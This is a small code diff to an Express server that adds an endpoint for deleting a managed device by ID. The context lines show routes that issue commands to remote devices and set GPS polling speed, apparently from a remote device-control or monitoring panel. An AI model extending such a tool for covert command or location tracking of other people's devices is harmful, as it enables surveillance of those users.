@@ -135,6 +135,12 @@ routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
     });
 });
 
+routes.post('/manage/:deviceid/delete', isAllowed, (req, res) => {
+    clientManager.deleteClient(req.params.deviceid);
+    logManager.log(CONST.logTypes.info, "Deleted device: " + req.params.deviceid);
+    res.json({ error: false, message: 'Device deleted' });
+});
+
 routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
     clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
         if (!error) res.json({ error: false })
